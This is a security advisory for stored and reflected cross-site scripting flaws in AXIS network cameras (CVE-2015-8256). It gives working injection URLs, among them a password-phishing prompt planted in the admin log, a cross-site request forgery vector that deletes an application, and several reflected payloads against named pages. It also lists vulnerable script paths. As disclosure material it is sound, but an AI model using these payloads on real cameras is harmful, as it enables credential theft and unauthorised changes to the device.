@@ -1,0 +1,138 @@
+id: 27335
+date: 03/17/2017
+title: AXIS Network Camera Cross Site Scripting Vulnerability
+author: Orwelllabs
+cves: CVE-2015-8256
+
+I. ADVISORY INFORMATION
+-----------------------
+Title: Axis Network Cameras Multiple Cross-site scripting
+Vendor: Axis Communications
+Class: Improper Input Validation [CWE-20]
+CVE Name: CVE-2015-8256
+Remotely Exploitable: Yes
+Locally Exploitable: No
+OLSA-ID: OLSA-2015-8256
+
+
+vulnerability
+-------------
+AXIS Network Cameras are prone to multiple (stored/reflected) cross-site
+scripting vulnerability.
+
+technical details
+-----------------
+** STORED XSS
+
+
+# 1 Attacker injects a javascript payload in the vulnerable page (using
+some social enginner aproach):
+
+http://{axishost}/axis-cgi/vaconfig.cgi?action=get&name=<script
+type="text/javascript>prompt("AXIS_PASSWORD:")</script>
+
+This will generate an error like this on page:
+
+"
+Error processing XML: Incorrect formatting
+line number 2, column 60:
+<error type = "No_such_application" message = "No application" '<script
+type="text/javascript>prompt("AXIS_PASSWORD:")</script>'
+----------------------------------------------------------------^
+"
+
+and also will create a entry in the genneral log file (/var/log/messages)
+with the JSPayload:
+
+"
+<INFO    > Apr 11 10:08:45 axis-eac8c03d901 vaconfig.cgi: Could not find
+application '<script
+type="text/javascript>prompt("AXIS_PASSWORD:")</script>'
+"
+
+When the user is viewing the log 'system options' -> 'support' -> 'Logs &
+Reports':
+http://{axishost}/axis-cgi/admin/systemlog.cgi?id
+
+the JSPayload will be interpreted by the browser and the Javascript prompt
+method will be executed showing a prompt asking user for the password
+('AXIS_PASSWORD').
+
+* With this vector an attacker is able to perfome many attacks using
+javascript, for example to hook users browser, capture users cookie,
+performe pishing attacks etc.
+
+However, due to CSRF presented is even possible to perform all actions
+already presented: create, edit and remove users and applications, etc. For
+example, to delete an application "axis_update" via SXSS:
+
+http://{axishost}/axis-cgi/vaconfig.cgi?action=get&name=<script src="http://
+axishost/axis-cgi/admin/local_del.cgi?+/usr/html/local/viewer/axis_update.shtml"></script>
+
+
+A reflected cross-site scripting affects all models of AXIS devices on the
+same parameter:
+http://
+{axis-cam-model}/view/view.shtml?imagePath=0WLL</script><script>alert('AXIS-XSS')</script><!--
+
+# Other Vectors
+http://
+{axishost}/admin/config.shtml?group=%3Cscript%3Ealert%281%29%3C/script%3E
+
+http://{axishost}/view/custom_whiteBalance.shtml?imagePath=<img src="xs"
+onerror=alert(7) /><!--
+http://{axishost}/admin-bin/editcgi.cgi?file=<script>alert(1)</script>
+
+http://
+{axishost}/operator/recipient_test.shtml?protocol=%3Cscript%3Ealert%281%29%3C/script%3E
+
+http://
+{axishost}/admin/showReport.shtml?content=alwaysmulti.sdp&pageTitle=axis</title></head><body><pre><script>alert(1)</script>
+
+# SCRIPTPATHS:
+
+{HTMLROOT}/showReport.shtml
+{HTMLROOT}/config.shtml
+{HTMLROOT}/incl/top_incl.shtml
+{HTMLROOT}/incl/popup_header.shtml
+{HTMLROOT}/incl/page_header.shtml
+{HTMLROOT}/incl/top_incl_popup.shtml
+{HTMLROOT}/viewAreas.shtml
+{HTMLROOT}/vmd.shtml
+{HTMLROOT}/custom_whiteBalance.shtml
+{HTMLROOT}/playWindow.shtml
+{HTMLROOT}/incl/ptz_incl.shtml
+{HTMLROOT}/view.shtml
+{HTMLROOT}/streampreview.shtml
+
+
+Impact
+------
+allows to run arbitrary code on a victim's browser and computer if combined
+with another flaws in the same devices.
+
+Affected products
+-----------------
+Multiple Axis Network products.
+
+solution
+--------
+It was not provided any solution to the problem.
+
+Credits
+-------
+The vulnerability has been discovered by SmithW from OrwellLabs
+
+Legal Notices
+-----------------
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise. I accept no
+responsibility for any damage caused by the use or misuse of this
+information.
+
+
+About Orwelllabs
+++++++++++++++++
+doublethinking...
+
+#  0day.today [2023-03-24]  #
